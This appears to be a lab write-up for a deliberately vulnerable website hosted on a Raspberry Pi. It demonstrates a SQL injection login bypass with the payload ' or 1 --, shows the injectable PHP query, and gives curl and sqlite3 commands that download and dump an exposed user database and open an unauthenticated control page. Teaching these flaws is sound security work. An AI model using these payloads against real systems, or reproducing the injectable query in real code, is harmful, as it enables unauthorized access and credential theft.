# Vulnerable Website Attacks

This section explores SQL Injection and Broken Access Control attacks on the vulnerable website, highlighting weaknesses in authentication and access control mechanisms.

### SQL Injection

To perform the SQL Injection attack on the vulnerable website, follow these steps:

1. Connect to the IP address of the Raspberry Pi (in our case, 10.10.1.231) on port 51130.

2. On the login page, follow these instructions:

   - In the "Username" field, enter the following string:
     ```
     ' or 1 --
     ```
   - Leave the "Password" field empty or enter any value.

3. Submit the login form. The SQL Injection payload `' or 1 --` manipulates the underlying SQL query, bypassing the authentication mechanism and tricks the system into authenticating the user successfully.

4. Behind the scenes, the vulnerable code snippet executes the following query:

   ```php
   $id = $_POST['id'];
   $pw = $_POST['pw'];
   $query = "SELECT id FROM user WHERE id = '{$id}' AND pw = '{$pw}'";
   $result = $db->query($query);
   if ($result == false) {
       $txt = "Login Error";
   } else {
       print("Login Successful");
   }
    ```

    The vulnerability lies in the way the code constructs the SQL query. By injecting the payload `' or 1 --`, the SQL statement becomes:

   ```php
    $query = "SELECT id FROM user WHERE id = '' or 1 -- AND pw = '{$pw}'";
    ```

    The modified query includes the injected condition `or 1`, which always evaluates to true. As a result, the authentication check is bypassed, and the system considers the login successful. Upon successful login, the vulnerable website redirects the attacker to the `control.php` page, granting them access to open the vault door.

### Broken Access Control

To exploit the Broken Access Control vulnerability in the vulnerable website, follow these steps:

#### Access to Database Directory

1. The directory structure of the vulnerable website is as follows:

    ```bash
    ├── db
    │ └── db.sql
    ├── control.php
    ├── css.css
    ├── dbconn.php
    ├── index.php
    ├── jquery-2.2.4.min.js
    └── js.js
    ```


2. Perform the following command to obtain the database file:

    ```bash
    curl http://10.10.1.231:51130/__db__/db.sql --output db.sql
    ```

    This command downloads the `db.sql` file from the `__db__` directory.

3. Once the db.sql file is obtained, execute the following command to print the content of the database:

    ```sql
    sqlite3 db.sql "SELECT * FROM user"
    ```

    This command uses SQLite to query and retrieve the data from the user table within the obtained database file.

#### Lack of Session Management

1. In addition to the access to the database directory, there is a lack of Session Management for accessing the `control.php` page. This means that even without authenticating, a malicious user can still access the page.

    To highlight this, execute the following command (or perform the action in a web browser):

    ```bash
    curl http://10.10.1.231:51130/control.php
    ```

    This command accesses the `control.php` page without authentication, demonstrating the lack of proper session management. It allows unauthorized access to the web page.

    **Note:** Tools like DirBuster can be used to discover hidden files or directories, but they are not specifically related to this vulnerability.